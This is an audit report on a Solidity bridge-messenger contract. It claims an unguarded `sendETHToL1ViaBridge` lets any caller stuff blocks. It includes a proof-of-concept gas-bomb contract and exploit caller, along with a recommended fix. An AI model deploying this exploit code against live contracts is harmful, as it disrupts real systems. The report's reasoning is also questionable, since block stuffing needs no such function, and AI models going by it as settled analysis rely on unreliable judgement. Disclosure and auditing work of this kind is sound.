Audit Report

## Title
Unguarded `sendETHToL1ViaBridge` Accepts Arbitrary `l2bridge`, Enabling Block Stuffing — (`contracts/bridges/UnichainMessenger.sol`)

## Summary

`UnichainMessenger.sendETHToL1ViaBridge` is `external payable nonReentrant` with no role guard and accepts a fully caller-controlled `l2bridge` address. Any unprivileged caller can supply a malicious contract whose `bridgeETHTo` triggers `INVALID`, consuming all forwarded gas and reverting the transaction. Repeated submissions can stuff consecutive Unichain blocks, delaying the `BRIDGER_ROLE`'s `bridgeAssetsViaNativeBridge` calls.

## Finding Description

`UnichainMessenger.sendETHToL1ViaBridge` imposes only a `msg.value == value` check before making an uncapped external call to the caller-supplied `l2bridge`: [1](#0-0) 

`DEFAULT_GAS_LIMIT = 200_000` is passed as the `_minGasLimit` parameter for L1 execution — it is **not** a gas stipend on the L2 call itself: [2](#0-1) 

Under EIP-150, the call to `l2bridge.bridgeETHTo` forwards all but 1/64th of remaining gas. A malicious `bridgeETHTo` that executes `assembly { invalid() }` consumes all forwarded gas and causes the entire transaction to revert, burning the attacker's gas but also consuming the block's gas budget.

The legitimate caller path (`RSETHPoolNoWrapper.bridgeAssetsViaNativeBridge`) is protected by `onlyRole(BRIDGER_ROLE)` and uses an admin-configured `l2Bridge` storage variable: [3](#0-2) 

But `UnichainMessenger` itself has no such protection, so the attacker bypasses the pool entirely and calls the messenger directly. The identical pattern exists in `BaseMessenger` and `OptimismMessenger`: [4](#0-3) [5](#0-4) 

## Impact Explanation

**Low — Block stuffing.** An attacker can repeatedly submit transactions that consume the full Unichain block gas limit, delaying or preventing the `BRIDGER_ROLE`'s `bridgeAssetsViaNativeBridge` from being included. No user funds are directly stolen or frozen, but the bridge's ETH withdrawal flow is disrupted for the duration of the attack.

## Likelihood Explanation

The function is publicly callable with no prerequisites beyond holding 1 wei. Unichain (OP Stack) gas costs are low, making repeated block stuffing economically feasible. The attack requires no privileged access, no front-running, and no external protocol compromise — only deploying a one-function malicious contract and calling `sendETHToL1ViaBridge` with 1 wei.

## Recommendation

Validate `l2bridge` against an immutable canonical bridge address set at construction, or restrict `sendETHToL1ViaBridge` to `BRIDGER_ROLE` so only the pool contracts can invoke it. Apply the same fix to `BaseMessenger`, `OptimismMessenger`, `ArbitrumMessenger`, and `ScrollMessenger`:

```solidity
address public immutable CANONICAL_L2_BRIDGE;

function sendETHToL1ViaBridge(address l2bridge, address target, uint256 value)
    external payable nonReentrant
{
    if (l2bridge != CANONICAL_L2_BRIDGE) revert InvalidBridge();
    if (msg.value != value) revert MismatchedMsgValue();
    IUnichainMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
}
```

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

contract GasBombBridge {
    function bridgeETHTo(address, uint32, bytes memory) external payable {
        assembly { invalid() } // consumes all forwarded gas
    }
    receive() external payable {}
}

contract BlockStuffingTest {
    function exploit(address unichainMessenger) external payable {
        GasBombBridge bomb = new GasBombBridge();
        IUnichainMessenger(unichainMessenger).sendETHToL1ViaBridge{value: 1}(
            address(bomb), address(0xdead), 1
        );
    }
}
```

Deploy `GasBombBridge`, call `exploit` with 1 wei. The call to `bomb.bridgeETHTo` triggers `INVALID`, consuming all gas forwarded by `sendETHToL1ViaBridge`. Repeat across blocks to prevent `BRIDGER_ROLE` from landing `bridgeAssetsViaNativeBridge`. A Foundry fork test on a Unichain fork can confirm gas exhaustion by asserting `gasleft()` before and after the call, or by observing the revert with `OutOfGas`.

### Citations

**File:** contracts/bridges/UnichainMessenger.sol (L16-16)
```text
    uint32 public constant DEFAULT_GAS_LIMIT = 200_000;
```

**File:** contracts/bridges/UnichainMessenger.sol (L24-27)
```text
    function sendETHToL1ViaBridge(address l2bridge, address target, uint256 value) external payable nonReentrant {
        if (msg.value != value) revert MismatchedMsgValue();
        IUnichainMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
    }
```

**File:** contracts/pools/RSETHPoolNoWrapper.sol (L431-444)
```text
    function bridgeAssetsViaNativeBridge() external nonReentrant onlyRole(BRIDGER_ROLE) {
        UtilLib.checkNonZeroAddress(l2Bridge);
        UtilLib.checkNonZeroAddress(messenger);
        UtilLib.checkNonZeroAddress(l1VaultETHForL2Chain);

        // withdraw ETH - fees
        uint256 ethBalanceMinusFees = getETHBalanceMinusFees();

        IL2Messenger(messenger).sendETHToL1ViaBridge{ value: ethBalanceMinusFees }(
            l2Bridge, l1VaultETHForL2Chain, ethBalanceMinusFees
        );

        emit BridgedETHToL1ViaNativeBridge(l1VaultETHForL2Chain, ethBalanceMinusFees);
    }
```

**File:** contracts/bridges/BaseMessenger.sol (L23-26)
```text
    function sendETHToL1ViaBridge(address l2bridge, address target, uint256 value) external payable nonReentrant {
        if (msg.value != value) revert MismatchedMsgValue();
        IBaseMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
    }
```

**File:** contracts/bridges/OptimismMessenger.sol (L24-27)
```text
    function sendETHToL1ViaBridge(address l2bridge, address target, uint256 value) external payable nonReentrant {
        if (msg.value != value) revert MismatchedMsgValue();
        IOptimismMessenger(l2bridge).bridgeETHTo{ value: value }(target, DEFAULT_GAS_LIMIT, bytes(""));
    }
```
